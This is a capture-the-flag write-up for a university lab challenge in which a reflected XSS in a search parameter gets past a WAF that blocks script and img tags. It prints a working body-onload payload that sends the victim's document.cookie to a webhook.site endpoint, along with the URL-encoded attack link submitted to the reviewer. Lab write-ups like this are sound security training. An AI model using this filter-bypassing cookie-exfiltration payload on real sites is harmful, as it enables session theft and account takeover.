# Challenge `Give me more than a simple WAF` writeup

- **Vulnerability:** XSS
- **Where:** in in search and feedback
- **Impact:** Allows execution of arbitrary script in site owner's browser

## Steps to reproduce

1. Create a request bin in **webhook.site**
1. Create a script that requests the created endpoint and sends the user cookie as a query parameter but that does not use the script or img tag since this are being block: `<body onload=window.open("http://webhook.site/3cf170ec-fafe-4c0a-83be-50f34d4429f9?q="+document.cookie)>`. This script leverages the use of inline script in an HTML body tag, which is not being blocked.
1. Insert into feedback URL bar after URL encoding `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=%3Cbody+onload%3Dwindow.open%28%22http%3A%2F%2Fwebhook.site%2F3cf170ec-fafe-4c0a-83be-50f34d4429f9%3Fq%3D%22%2Bdocument.cookie%29%3E` for the reviewer to access a page with a malicious search query. The description does not matter.
1. Submit feedback and get the flag from webhook website.
